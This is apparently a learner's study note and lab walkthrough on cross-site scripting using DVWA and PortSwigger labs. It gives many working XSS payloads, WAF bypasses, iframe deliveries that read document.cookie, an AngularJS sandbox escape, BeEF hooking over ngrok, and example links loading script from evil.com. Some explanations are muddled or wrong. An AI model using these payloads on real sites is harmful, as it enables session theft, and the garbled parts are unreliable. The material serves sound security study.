# 11.B XSS Cross Site Scripting with PortSwigger

The Beginning of Hacking !!!



{% file src="../../../../.gitbook/assets/11.B XSS Cross Site Scripting with PortSwigger.docx" %}

{% file src="../../../../.gitbook/assets/11.B XSS Cross Site Scripting with PortSwigger.zip" %}

## Cross-Site Scripting (XSS)

* Cross Site Scripting (XSS) refers to a vulnerability on the client side where harmful code is transmitted to a server. When the code returns, the browser fails to render or sanitize it, which leads to execution.
* Normally this harmful code is written in JavaScript.

## JavaScript

* JavaScript is a scripting language used to add interactivity and functionality to web applications.
* Actions like clicking buttons, hovering, and more are executed through JavaScript and sent to the server for processing.

## Types of XSS Attacks

* It’s a web application vulnerability where unsanitized output leads to malicious activity/script.
* Mostly JavaScript is used because it performs actions.
* XSS has three methods:
  * Reflected XSS: where the website failed to sanitize the request and the malicious script comes from the website request.
  * Stored XSS: where the website failed to sanitize the request and the malicious script comes from the website database.
  * DOM XSS: where the website action tabs failed to sanitize the request and the malicious code comes from client-side code.

## Reflected XSS Attack

* In a reflected XSS attack, malicious code is injected into a website's input (e.g., search bar).
* When a user submits the input, the server sends back a response that includes the injected code.
* The browser then renders this response, executing the malicious code.

### Example of Reflected XSS Attack

* The attacker sends a target a web link that appears legitimate.
* When the user clicks the link, a request is made to the vulnerable website's server or redirected to the attacker server.
* The server processes the input and sends back a response containing the attacker's injected script.
* The browser, trusting the server's response, renders the page along with the malicious script.
* The executed script can steal sensitive information like session cookies, compromising user security.

#### Key Points

* The injected code isn't stored on the server but is executed on the user's browser.
* The browser should ideally validate and sanitize input data to prevent this vulnerability.
* Reflected XSS is dangerous as it targets unsuspecting users and exploits their trust in legitimate websites.

## DVWA (Damn Vulnerable Web Application) - Reflected XSS Security Level Low

### Normal Output

![](../../../../.gitbook/assets/media54d6de3e-f30e-4a39-855c-64201688c87a.png)

### Always view the source code

```php
<?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
} 
?>
```

### Vulnerable Output

![](../../../../.gitbook/assets/mediae8a7b593-a1ba-4281-ae64-a6bcf6f55fe1.png)

* In the normal output, the code checks if the `"name"` parameter is not NULL before echoing a `"Hello"` message with the input name.
* In the vulnerable output, there's a typo in the HTML tag, but the code logic remains the same.
* In short this code is deny the echo output if the value is NULL.

## DVWA XSS Reflected Security Level Medium

### Normal Output

![](../../../../.gitbook/assets/mediaa9e60bb2-ae52-4805-95ec-4f7316a78b55.png)

* The source code indicates that in the `"name"` function, any user input is processed to remove `<script>` HTML tags and replace them with commas before echoing the result.
* In short, the code sanitizes user input to prevent script tags and then echoes it back.

### Vulnerable Output

![](../../../../.gitbook/assets/media8c17da8f-62d1-441e-b0aa-fd302273c6bc.png)

* In the vulnerable output, the code's sanitization logic is insufficient because it only removes lowercase `<script>` tags, allowing `<script>` tags with uppercase letters to remain.
* This vulnerability can potentially lead to an XSS attack if an attacker uses mixed-case script tags to inject malicious scripts.

## DVWA XSS Reflected Security Level High

### Normal Output

![](../../../../.gitbook/assets/media26c77ac9-df83-47c7-a1e0-959adb75e11c.png)

* The source code removes some HTML tags, replaces them with commas, and then echoes the user input.
* However, there is no restriction on using the `<img>` HTML tag, which can potentially be used for an XSS attack.

### Vulnerable Output

![](../../../../.gitbook/assets/mediacbc72860-e547-4fb7-bf77-0cd9db8a78b5.png)

* In the vulnerable output, the code does not adequately prevent the use of the `<img>` HTML tag, which can be exploited by an attacker to execute an XSS attack.
* This represents a security risk in the application.

## HTML Injection

* HTML Injection, also known as Client-Side Code Injection, is a type of vulnerability where a client (user) sends input that includes HTML code to a server.
* The web application's server fails to properly validate or sanitize this input, leading to the injection of HTML code into the server's response.
* Consequently, when the server sends the response back to the client's browser, the browser fails to verify the HTML code, resulting in its direct rendering.

### Normal Input

![](../../../../.gitbook/assets/media5535a0f4-9572-4b78-91f1-822b412d2b08.png)

* In a normal scenario, the input provided by the user is treated as plain text and is displayed as is.

### HTML Injection

![](../../../../.gitbook/assets/media5535a0f4-9572-4b78-91f1-822b412d2b08.png)

* In the case of HTML injection, the user intentionally provides input that includes HTML code.
* This input is then processed by the server, and the HTML code is rendered as part of the response, affecting the client's browser rendering.

### Impact of HTML Injection

* When HTML injection occurs, the injected HTML code can lead to various issues, such as altering the appearance of the web page, displaying content not intended by the website owner, or even executing malicious scripts on the client's browser.

### Mitigation

* To prevent HTML injection vulnerabilities, web applications should properly validate and sanitize user inputs before processing them.
* This ensures that any HTML code provided by users is treated as plain text and not executed as code.

### Key

* HTML injection occurs when user-provided HTML code is not properly validated or sanitized.
* The injected HTML code is rendered by the client's browser, affecting the appearance and behavior of the web page.
* Mitigation involves implementing proper input validation and sanitization to prevent the execution of malicious HTML code.

## Stored XSS Attack

* An instance when malicious script is injected directly on the server.
* The client browser sends some malformed code to the server, which the server executes and adds in response.

### What a Stored XSS Attack?

* Imagine a website where users can leave comments or post messages.
* Sometimes, bad actors can sneak in harmful code (like secret instructions) through these comments.
* This harmful code is like a virus that can cause trouble when other people view the same page later.

### How It Happens

* Sneaking In Trouble: a bad person slips in dangerous code while writing a comment. This code might look like normal text, but it's secretly harmful.
* Hiding in Plain Sight: the sneaky code becomes part of the website's stuff, mixed in with the good things people have posted.
* Causing Trouble: when someone else visits the page with the dangerous comment, their web browser follows the harmful code's instructions. This can lead to annoying pop-up messages, stealing private info, or even worse things.

### What's at Risk

If the bad/malicious code works, it can:

* Steal private stuff like passwords or cookies.
* Do things on someone's account without permission.
* Trick people into going to fake websites or downloading bad stuff.

### Example

Imagine someone wrote a comment with this tricky code:

```html
<script>alert('Your account is in danger!');</script>
```

### Mitigation

* To prevent Stored XSS attacks, web developers must validate and sanitize user input before storing it in the database.
* Additionally, output encoding should be applied when rendering user-generated content on web pages.
* Implementing Content Security Policy (CSP) helps.

## DVWA Low-Level Stored XSS

### Vulnerable Output

![](../../../../.gitbook/assets/media881abf58-f595-48b1-b17c-805e81a23133.png)

## DVWA Medium-Level Stored XSS

### Vulnerable Output

![](../../../../.gitbook/assets/media60d8ba0b-fba9-4a4c-982e-4d0d8412e200.png)

* Used Burp Suite to verify which HTML tags are working.
* The message box is sanitized, but not the name box.
* So, change the max-length to full to write the code. Double-click on max-length to change it.
* The same technique works in the high security level as well.

![](../../../../.gitbook/assets/mediaef80ba6c-5400-467f-afc7-a8bb789ed5b7.png)

**NOTE:** That same work in high also.

## DOM-based XSS Attack

* DOM stands for Document Object Model, which represents the structure of a webpage as a tree-like structure, essentially the source code of a website.
* A DOM-based XSS attack occurs when malicious scripts are present in the web page that a browser loads.
* Unlike reflected XSS attacks, these attacks don't need to be sent to the server to activate.

### Browser's Existing JavaScript

* In a DOM-based attack, the attacker abuses the website's existing JavaScript code by injecting malformed JavaScript, which is then executed by the browser without communication with the server.
* This malformed code is referred to as DOM.

### Visible in the URL

* In a DOM-based attack, malicious script can often be observed in the URL.

### Parameter Values in the URL

* Many websites include parameter values in their URLs, often reflecting user input.
* For example, a site might allow users to select color themes, and the selected theme appears in the URL.
* Attackers can manipulate these parameters to introduce malicious JavaScript.

### Hackers' Objectives

* Hackers use DOM-based cross-site scripting techniques to steal sensitive information.

### Example

* For example, they could hide malicious JavaScript within HTML tags in the URL.
* The browser processes the HTML and executes the JavaScript.

### Example screenshots

| No JavaScript in Index                                                         |
| ------------------------------------------------------------------------------ |
| ![](../../../../.gitbook/assets/mediabb04c462-ca7b-4905-9906-79011370e475.png) |

| After Clicking in POST, JavaScript Appears                                     |
| ------------------------------------------------------------------------------ |
| ![](../../../../.gitbook/assets/media8812439e-ed00-4ba2-afd2-08e721dd801c.png) |

| Behavior of `location.search`                                    |
| ---------------------------------------------------------------- |
| `location.search` outputs the content of the URL's query string. |

| After click in POST Got some JavaScript                                        |
| ------------------------------------------------------------------------------ |
| What `location.search` gives                                                   |
| ![](../../../../.gitbook/assets/media745d9509-699d-4a38-8464-e37e5b53554e.png) |

| It output which the URL location & customized the input                        |
| ------------------------------------------------------------------------------ |
| ![](../../../../.gitbook/assets/media73dda0da-528e-4d52-ac39-7103635773c4.png) |

| The `location.search` is searching for `storeid`                               |
| ------------------------------------------------------------------------------ |
| ![](../../../../.gitbook/assets/mediaf457ddec-328f-4517-8c3b-1d84e4cee3b8.png) |

| Modifying the `storeId` Parameter with Malicious JavaScript                    |
| ------------------------------------------------------------------------------ |
| ![](../../../../.gitbook/assets/media49b4eac9-be83-48f1-b6f3-d4392c7da3b3.png) |
| ![](../../../../.gitbook/assets/mediaab345eea-e13a-48fa-9250-b53d089a6a2f.png) |

| Closing HTML Tags to Inject Malicious JavaScript                               |
| ------------------------------------------------------------------------------ |
| ![](../../../../.gitbook/assets/media4a940162-728f-4f68-9784-71220c0b384d.png) |

| Results                                                                        |
| ------------------------------------------------------------------------------ |
| ![](../../../../.gitbook/assets/mediacc4842a7-3e65-4441-beac-8f64dbeb2427.png) |

## DVWA Low Security DOM

### Normal Output

![](../../../../.gitbook/assets/media6a151b1e-3081-4a9d-bb40-47a25e251634.png)

* On button click, it sets the value of the default parameter to `"English"` in the URL.
* In short, when the button is clicked, the URL parameter is changed to `"English."`

![](../../../../.gitbook/assets/media871697e6-22c6-47c0-bcb3-a5869ee02438.png)

### Vulnerable Output

![](../../../../.gitbook/assets/media83c1a5c3-26f1-42b5-afd6-7b38961c3042.png)

* In the vulnerable output, the URL parameter has been manipulated or tampered with, resulting in the same display as the normal output.

## DOM XSS Medium Security

### Normal Output

![](../../../../.gitbook/assets/media7cf75f6d-3abc-4f30-a879-4ed9a53e9d8d.png)

* There is a select tag so close the select tag.
* `</select>` and the Burp results show:
* The `<img>` tags work now, and the JavaScript code can be executed using Burp.

![](../../../../.gitbook/assets/media91ddf330-fe7b-47d3-b66e-b532b174779f.png)

* In short, the description mentions the presence of a select tag and the use of Burp to execute JavaScript code.

### Vulnerable Output

![](../../../../.gitbook/assets/mediac99bd3e7-e3fa-41a3-9d88-e89cfec77cea.png)

## DOM High-Level Security

### Normal Output

* The code specifies that it redirects to `location.default=English`.
* It suggests using the `&` function because it is a logical AND operator and will also be treated as valid.

![](../../../../.gitbook/assets/mediac5bd1374-e963-4605-bbbe-6ae8a98592fa.png)

* In short, the code is redirecting to `location.default=English`, and the description suggests using the `&` function to manipulate the URL.

### Vulnerable Output

![](../../../../.gitbook/assets/media4daf1308-cb33-4566-be10-fde2aaeb76b8.png)

* In the vulnerable output, only the `<photo>` tag is displayed.

## BeEF XSS

* BeEF XSS is a JavaScript framework that hooks into a web browser.
* It logs all the activities performed on the page and presents them in the BeEF interface.

## Ngrok

* Ngrok is used to enable BeEF XSS over a Wide Area Network (WAN).
* It works through tunneling.

## Tunneling

* Tunneling is a process where network traffic is redirected through an intermediate server.
* It's used for various purposes, including routing traffic over the internet securely.

## Example

* When software like TeamViewer or AnyDesk operates through tunneling, it starts by providing the client with a token from the server.
* The software validates this token and then routes network traffic through the servers of AnyDesk/TeamViewer, which have their own public IP addresses.
* These servers redirect the traffic to its intended destination, typically the second client.
* In this setup, the server acts as a middleman, facilitating end-to-end communication between clients over the WAN.
* Ngrok functions similarly. When a client installs Ngrok, it provides a temporary subdomain and a random port.
* All communication that occurs over these temporary subdomains and ports is tunneled to the end client's localhost.

Both BeEF XSS and Ngrok can be used together.

![](../../../../.gitbook/assets/media6bb07495-73f2-44e3-a992-f2839a0c0f85.png) ![](../../../../.gitbook/assets/mediae9574371-edbb-4e65-8f7b-e63516134976.png) ![](../../../../.gitbook/assets/media06e694e6-6786-4a49-abc3-d2147d7534d1.png) ![](../../../../.gitbook/assets/media308a2cab-64c8-4156-a225-d71e69bd9e28.png) ![](../../../../.gitbook/assets/media47f70623-0531-407d-a08a-151a66843cb6.png) ![](../../../../.gitbook/assets/media36b5bdc1-12bd-4d10-b15e-941937d7a57a.png)

Getting block in real-time from WAN endpoint

![](../../../../.gitbook/assets/mediab5e7e8f2-6bb9-4d27-a551-afc694db3792.png)

## Mutation XSS

* Mutation XSS (MXSS) is a type of cross-site scripting vulnerability where an attacker can manipulate or influence a script executed by the victim's browser.
* MXSS occurs when a script mutates from a safe, filtered state to an unsafe, unfiltered state.
* It often happens in the context of the HTML DOM `innerHTML` function.
* Attackers can exploit this vulnerability by manipulating input that eventually becomes part of a script executed by the browser.
* By doing so, they can bypass input validation and execute malicious code within the victim's browser.
* Mutation XSS can be a serious security concern and should be mitigated through proper input validation and output encoding to prevent attackers from injecting and executing malicious scripts in the victim's browser.

## PortSwigger Validation

### What is cross site scripting (XSS)

* A vulnerable web application that allows the attacker to send malicious code to the victim.
* This results in cookie steal, password theft, and sensitive data theft.

### How does it work

* A vulnerable web application is tricked by the attacker to return the malicious code to the user.
* Then a user executes the malicious code, which results in cookie steal, sensitive data, or compromised system.

### Types of XSS

* Reflected XSS: when the malicious code request comes from the current HTTP request.
* Stored XSS: when the malicious code request comes from the database.
* DOM Based XSS: when the vulnerability is in client-side code.

### Reflected XSS

![](../../../../.gitbook/assets/media55c56aa2-909c-450e-92e9-74b06fd2fa7d.png)

### Stored XSS

![](../../../../.gitbook/assets/media5d56762d-ed73-431b-b255-1792ae148c60.png)

### DOM Based XSS

![](../../../../.gitbook/assets/media69bacf93-e923-4415-b434-65583be50fea.png)

***

## XSS Cross Site Scripting

* A vulnerable web application that allows the attacker to send malicious code to the victim.
* This results in cookie steal, password theft, and sensitive data theft.

### How does it work

* A vulnerable web application is tricked by the attacker to return the malicious code to the user.
* Then a user executes the malicious code, which results in cookie steal, sensitive data, or compromised system.

### Types of XSS Cross Site Scripting

* Reflected XSS Cross Site Scripting: when the malicious code comes from the current HTTP request.
* Stored XSS Cross Site Scripting: when the malicious code comes from the database.
* DOM Based XSS Cross Site Scripting: when the malicious code comes from the client side rather than the server side.

### Reflected XSS

* Allows execution of malicious code into a web application input parameter (Search bar), and the web application executes the malicious code which responds in the browser.

### What is reflected XSS

* When the application has an input parameter where the user request and gets reflected back in the response.
* Like: [https://amazon.in/shopping/laptop=?hp](https://amazon.in/shopping/laptop=?hp)
* Where the `hp` is reflected in the response.
* Assuming the web application is vulnerable, the attacker tricks the application or adds malicious code.
* Like: [https://amazon.in/shopping/laptop=?hp%3cscirpt%3ehttps://evil.com/badcode.js%3c/scirpt>](https://amazon.in/shopping/laptop=?hp%3cscirpt%3ehttps://evil.com/badcode.js%3c/scirpt%3E)
* This leads to the user getting cookie or sensitive data stolen.

#### Example of Reflected XSS

* User clicks the attacker malicious link which looks legit.
* The request hits the vulnerable web application or attacker server (redirect).
* The server takes the malicious code and responds to the user with the attacker malicious code.
* The browser trusts the server and results in the malicious code being executed by the user.
* The malicious code can steal PII, session cookie, and compromise the user.

#### Key Points

* The malicious code is not stored or executed on the server; it's returned in the browser response and executed by the browser.
* The browser should validate and sanitize the inputted data.
* Reflected XSS targets random users and exploits the trust of the web application.

### Blackbox Reflected XSS

* Check for reflected response from the web application.
* If it's reflected, then check for any defense coding.
* Use `Ctrl + F` and check the reflected area.
* If it's in the HTML tags, try to break from them using existing tags and syntax like `>`, `"`, `'`, `</>` etc.
* Execute some JavaScript function like `alert` or `print` (alert is often blocked by browsers).
* The script word may be replaced with a space as input sanitization, which can be bypassed by using uppercase `SCRIPT`.
* The closing tags and double quote, which help in closing HTML tags, can be replaced with space and bypassed by using `<img src>` and `<svg>` tags.

### Defenses against Reflected XSS

* Create a function which sanitizes the code.
* Remove the `<script>` tags or replace the `<script>` tags with URL encoding space `%020`.
* Remove the opening, closing, brackets, and backslash or replace the opening/closing bracket `<>` and backslash with URL encoding space `0%20`.

### Stored XSS

* The client browser sends malicious code to the server, which executes on the server and responds in the browser.
* A vulnerable web application where the feature of comments and post is there, and the attacker uses that feature and posts malicious code.
* The server stores it, and when the user clicks the attacker post, that compromises the user system.

### What is Stored XSS

* When the application has store features like comments or posts.
* Like: [https://threads.com/comments=?normal+user+writing+comment](https://threads.com/comments=?normal+user+writing+comment)
* Assuming the web application is vulnerable to stored XSS, the attacker tricks it or adds malicious code.
* Like: [https://threads.com/comments=?normal+user+writing+comment%3cscript%3ehttps://evil.com%3c/scirpt>](https://threads.com/comments=?normal+user+writing+comment%3cscript%3ehttps://evil.com%3c/scirpt%3E)
* After the malicious code is stored in the web application and the user clicks it, it results in cookie steal or sensitive data steal etc.

### Blackbox Stored XSS

* Check the request and response for any defense headers.
* Fill all the input parameters and check the response in the source code.
* Check how the parameter is stored.

### Defense against Stored XSS

## DOM Based XSS

* Document Object Model is the structure webpage of the source code.
* An attacker inputs malicious code in the web application that the browser loads and compromises the system.

### Example

* A web application allows changing the theme where the attacker inputs the malicious code which sends it to the client and the client browser loads it, resulting in compromise or cookie theft.

### What is DOM

* There is a submit feature which uses JavaScript to submit the form.
* [https://createprofile.com/lang=english](https://createprofile.com/lang=english)
* Assuming the web application is vulnerable to DOM, the attacker uses the `lang` JavaScript function English parameter into the malicious code in the web application.
* Like: [https://createprofile.com/lang=alert(1)](https://createprofile.com/lang=alert\(1\)) to `https://createprofile.com/lang=english<script>alert(1)</script>`

### Blackbox DOM XSS

* Check the request and response for any defense headers.
* Fill all the input parameters and check the response in the source code.
* Break the HTML using closing tags or img tags inside JavaScript tag and JavaScript function.

### Defense against DOM-Based XSS

***

## Reflected Lab: Reflected XSS into HTML context with nothing encoded

### Normal Output

![](../../../../.gitbook/assets/mediaaa8e6d92-3c24-411e-9c19-23b8b2c167c6.png)

* Notice when the user input in the search parameter is reflected back in the source page and it's also reflecting the special characters with the backend should.
* Special characters are allowed, which means script tags are also allowed.

![](../../../../.gitbook/assets/media8379309a-b309-4524-b178-dca49c252140.png)

![](../../../../.gitbook/assets/mediac8a01a8b-1098-47d7-8579-7542168f4dfb.png)

### Vulnerable output

* Perform malicious activity using JavaScript, and to do that HTML `<script>` tags help.
* Copy and paste the following into the search box:

```html
<script>alert(1)</script>
```

* The web application should HTML encode the `<>` with spaces to mitigate that.

![](../../../../.gitbook/assets/media327b4e65-60af-4e81-952d-8005f704c91d.png)

* Sometimes there is WAF security which blocks alert tags.
* Find out which tags are allowed using brute force in Burp Suite.

![](../../../../.gitbook/assets/media0b6a9770-6157-4b23-8a17-d2049996cc4a.png)

* Seems it's blocking it.
* Open Burp Suite → Intruder → paste the value.
* Paste it into the sniper payload and start the attacks.

![](../../../../.gitbook/assets/media2a132f8d-d75e-4066-8e32-a9ff590d3183.png)

* The body tags work in the intruder.

![](../../../../.gitbook/assets/media20021c6c-9e7e-42f9-80f5-011248b9cfe0.png)

* Use the body tag and URL coding space parameter, which is `%20`.
* Add the value after `%20` to brute force in intruder.
* Copy and paste payloads from XSS Cheatsheet from PortSwigger and start the attack.

![](../../../../.gitbook/assets/media010f02cf-4262-442a-a218-c8de9d8d083c.png)

* The events that work are `onreset` and more.

![](../../../../.gitbook/assets/mediafde3e7a5-cbde-452a-80ac-f401fc646315.png)

* Go to the exploit server where the link can be sent to the victim.

![](../../../../.gitbook/assets/media03eecd55-5a91-4d0a-a425-6a06674e00dd.png)

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
```

* Note: use the malicious code after resize events.

### Delivery to victim POV

![](../../../../.gitbook/assets/media32d40103-7608-473f-9c62-300a2b0bf356.png)

## Reflected XSS into HTML context with all tags blocked except custom ones

* Do the same above process to find out which HTML tags is allowed and same for event tags.

![](../../../../.gitbook/assets/media5b5b2fc5-4cde-4e04-8e92-c0432e4f07b3.png)

### Vulnerable output

![](../../../../.gitbook/assets/mediab5c1ffff-5052-4889-ba81-c5ca95eeaa17.png)

![](../../../../.gitbook/assets/media9cb24974-e016-4cb7-a984-65b41475ea03.png)

## Reflected XSS into a JavaScript string with single quote and backslash escaped

![](../../../../.gitbook/assets/mediae164a1d8-7095-41e2-a193-c2ca4a383264.png)

* Whatever the search input is given, getting the output back means a DDOS also works.
* It is in the HTML `<h1>` tags, which using script tags the events can be performed or any malicious code.

### Events

```html
</script><script>alert(1)</script>
```

### Vulnerable output

![](../../../../.gitbook/assets/mediafe918302-c418-43af-bff3-bde36ed0d68b.png)

## Reflected XSS into a JavaScript string with angle brackets HTML encoded

* The JavaScript is blocking the unsanitized output.

![](../../../../.gitbook/assets/media843cfa2e-ccea-4ddc-b33e-414388ca95c7.png)

* The script tag is inside a `<h1>` tag and the img tag.

![](../../../../.gitbook/assets/mediad9673f75-6263-4a8e-bcf3-77b3de421d56.png)

![](../../../../.gitbook/assets/media576ca6c5-9b7f-4ca6-b1fe-20f29a078c8c.png)

* Which means it replaces `< >` with `&lt` and `&gt`.
* `'-`: The opening single quote followed by a hyphen.
* `alert(1)`: The JavaScript code snippet `alert(1)`.

![](../../../../.gitbook/assets/media0c36a967-197c-4646-9603-9a091fbe04aa.png)

![](../../../../.gitbook/assets/media3f03f7ef-7728-40e8-88d5-bd15cc0d09e8.png)

### The New Approach

Found this on Google: [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting?ref=learnhacking.io](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting?ref=learnhacking.io)

Inside HTML tag attributes:

If you can escape from the attribute but not from the tag (`>` is encoded or deleted), depending on the tag you could create an event that executes JS code:

```html
" autofocus onfocus=alert(1) x="
```

![](../../../../.gitbook/assets/media489cbad0-7ecd-4f67-b9dd-7c372620c4ec.png)

## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML encoded and single quotes escaped

![](../../../../.gitbook/assets/mediacd7bd67b-fed0-4a2f-a89c-acb8be3a1e45.png)

* The events are getting blocked by the single quotes.
* The single quotes (`'`) are in use.
* Seems the double quote was added by JavaScript.

![](../../../../.gitbook/assets/media575cef68-3dfc-4ec8-bf45-075ea4b126fa.png)

* By adding one backward slash to escape the blocking, it got another backward slash and double quotes.

![](../../../../.gitbook/assets/mediac5ee170a-da40-4992-b735-6831dd55a6f1.png)

### Vulnerable output

![](../../../../.gitbook/assets/mediad2cb38c6-82da-46b2-a0ec-68d67788d915.png)

![](../../../../.gitbook/assets/media828df7bf-0430-4a28-a0ea-3ab55a594589.png)

* After the events execute, the code gets sanitized in double quotes.

### Events

```
\'-alert()//
```

* The string `\'-alert()//` is a sequence of characters with various elements:
  * `\'`: this represents a single quote character (`'`).
  * `-`: the opening single quote by hyphen character.
  * `alert()`: this is a JavaScript function call to `alert()`.
  * `//`: everything after `//` on the same line is treated as a comment and is not executed.

## Reflected XSS into HTML context with most tags and attributes blocked

### Analysis

* There is WAF which is blocking malicious code.
* `"Tag is not allowed"`.

Using Burp Intruder, the body tag is allowed in WAF.

![](../../../../.gitbook/assets/media1eb7da27-0e42-4e9b-9c81-6aaa888d9f17.png)

![](../../../../.gitbook/assets/media55cae7d7-b732-4594-a697-201caed60c70.png)

![](../../../../.gitbook/assets/media287c564b-c978-417a-8cc4-eb887dc520ed.png)

### Bypass

```html
<body = onresize%3dprint()>
```

Using the iframe for exploit server:

```html
<iframe src="https://0ad0004d04ee2e7781b3a7a40069008f.web-security-academy.net//?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

![](../../../../.gitbook/assets/media5caf53ea-0095-4882-b0b9-57acfac38d1c.png)

![](../../../../.gitbook/assets/media1d6a85b0-484a-4139-8f9c-5319e5eb5283.png)

```html
<iframe src="https://0ad0004d04ee2e7781b3a7a40069008f.web-security-academy.net//?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

## Reflected XSS into HTML context with all tags blocked except custom ones

### Analysis

* Using Burp Intruder and found HTML tags are not allowed and custom tags are allowed.

```html
<custom-tag onmouseover='alert("1")'>
```

* Now the attribute is working onfocus and all, but complete the custom tag using `id=x`, `tabindex=1`, and a commentor `#x`.

```html
<custom-tag onfocus=alert(1)
```

* Building up the payload:

```html
<custom-tag onfocus='alert(document.cookie)' id='x' tabindex="1">#x
```

* `<xss>`: custom tag not blocked by the WAF.
* `id="x"`: sets the ID of the element to x.
* `onfocus="alert(document.cookie)"`: JavaScript to execute when the element is focused.
* `tabindex="1"`: makes the element focusable.
* `#x`: the fragment identifier to automatically focus on the element with ID x.

```
https://0a9a001103c24cf586055b28003600e1.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E#x
```

![](../../../../.gitbook/assets/mediacbf0eec7-1f58-4093-807c-c6ddcf57731b.png)

![](../../../../.gitbook/assets/mediad14183e3-4a50-452a-989a-c1b17cbfb5d1.png)

![](../../../../.gitbook/assets/media44ebc11c-5d2c-4ba7-9a0c-4da860df9aca.png)

### Bypass

* Now use the DOM location using `<script>` tag to exploit the server.

```html
<script> location = 'https://0a9a001103c24cf586055b28003600e1.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E#x'; </script>
```

![](../../../../.gitbook/assets/media059abfa2-0d71-417a-8544-7d8a8bfce666.png)

![](../../../../.gitbook/assets/mediaac1bd176-a1bb-4e04-81b6-a261f2ce1966.png)

![](../../../../.gitbook/assets/media6451db23-8e10-4c1b-8325-ebcd6414d0a4.png)

## Reflected XSS with some SVG markup allowed

### Analysis

* WAF is there which is doing its work.
* Tag which is allowed found using Burp Intruder.
* `<svg>` and its attributes.
* `<animateTransform>` using `onbegin` in `animateTransform` triggers JS.

![](../../../../.gitbook/assets/media0c13679f-0192-4520-b5f7-b70629379650.png)

![](../../../../.gitbook/assets/media8f752a38-89f5-471d-9587-ff725d30c33c.png)

### Bypass

* Found the payload using Intruder:

```html
<svg><animatetransform onbegin="alert(1)"></svg>
```

![](../../../../.gitbook/assets/media60057060-5665-40ae-8817-0f47882c21e8.png)

![](../../../../.gitbook/assets/media550f884a-6344-4036-9963-4648feca63da.png)

## Reflected XSS in canonical link tag

### Analysis

* Canonical link tag is used in header section to define preferred URL for web application.

```html
<link rel="canonical" href='https://0acf00d104e899c880e458ce00670059.web-security-academy.net/'/>
```

* Checking the user input:

```html
<link rel="canonical" href='https://0acf00d104e899c880e458ce00670059.web-security-academy.net/?hexruinx'/>
<link rel="canonical" href='https://0acf00d104e899c880e458ce00670059.web-security-academy.net/?'onload=alert(1)'/>
<link rel="canonical" href='https://0acf00d104e899c880e458ce00670059.web-security-academy.net/?'javascript:alert(1)'/>
```

* Accesskey attributes is used to setup keyboard shortcuts, so using accesskey and onclick=alert() to call JS using keywords.

### Bypass

```
https://0a6c00a9041c4b45840de18b007f00fd.web-security-academy.net/?'accesskey='x'onclick='alert(1)'
```

![](../../../../.gitbook/assets/media9c3f0ef1-1a38-4429-ad91-5ed3a362d331.png)

![](../../../../.gitbook/assets/media0d078d7b-9b4a-4a43-9705-fc6b438900f1.png)

## Reflected XSS into a JavaScript string with single quote and backslash escaped

### Analysis

* Try to input some payload which results in:

```html
<section class="blog-header"> <h1>0 search results for ''> <img src=x onerror=alert(1)>'</h1> <hr> </section>
```

* Whatever payload is given, the two single quote characters come in the starting and ending.

![](../../../../.gitbook/assets/mediabdac105a-c9bd-47a2-8acb-a2a22a0c69bf.png)

### Bypass

```html
</script><script>alert(1)</script>
```

* The payload is reflected into the page as:

```html
var searchQuery = '</script><script>alert(1)</script>';
```

![](../../../../.gitbook/assets/media161f2949-feed-4293-a635-e7ac2187d519.png)

## Reflected XSS protected by very strict CSP with dangling markup attack

### Check the email parameter is vuln

![](../../../../.gitbook/assets/media89a004fe-5def-453f-bef7-76c62e42bf46.png)

* But it needs human interaction to update email which will not happen.
* The malicious string is injected in the email parameter.
* Inspect the DOM and the injection point.

![](../../../../.gitbook/assets/media09254011-5843-423c-9074-7e79b7d83d26.png)

## Reflected XSS with AngularJS sandbox escape without strings

### Analysis

* Found the code is using Angular in body tags and replace special characters.

```html
<body ng-app="labApp" class="ng-scope">
<script src="/resources/labheader/js/labHeader.js"></script>
<section class="blog-header">
<script>
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
  $scope.query = {};
  var key = 'search';
  $scope.query[key] = '<script>alert(1)</script>';
  $scope.value = $parse(key)($scope.query);
});
</script>
<h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">0 search results for &lt;script&gt;alert(1)&lt;/script&gt;</h1>
<hr>
```

* Found on internet:
  * `toString()`: converts an object to a string, which helps us generate strings without using quotes.
  * `.constructor` accesses the constructor function of the string, which is the String constructor.
  * `charAt` method of the String prototype.
  * `%3d`: URL encoding for `=`, so `charAt%3d` is `charAt=`.
  * `[].join`: creates an empty array and joins elements into a string.
  * `;[1]`: semicolon separates JavaScript statements.

### Payload 1

```javascript
toString().constructor.prototype.charAt = [].join;
;[1]
```

* Used to add next payloads.
* Character codes:
  * `fromCharCode(120,61,97,108,101,114,116,40,49,41)`:
    * `120 = x`
    * `61 = =`
    * `97 = a`
    * `108 = l`
    * `101 = e`
    * `114 = r`
    * `116 = t`
    * `40 = (`
    * `49 = 1`

### Payload 2

```javascript
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

* `fromCharCode` converts Unicode values to characters, allowing us to construct strings like `alert(1)` without using quotes.

### Bypass

* Payload 1:

```javascript
toString().constructor.prototype.charAt = [1].join;
```

* Payload 2:

```javascript
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

## Reflected XSS with AngularJS sandbox escape and CSP

### Analysis

* The HTML tag are reflecting but the JavaScript is not executing.
* The CSP is the reason.

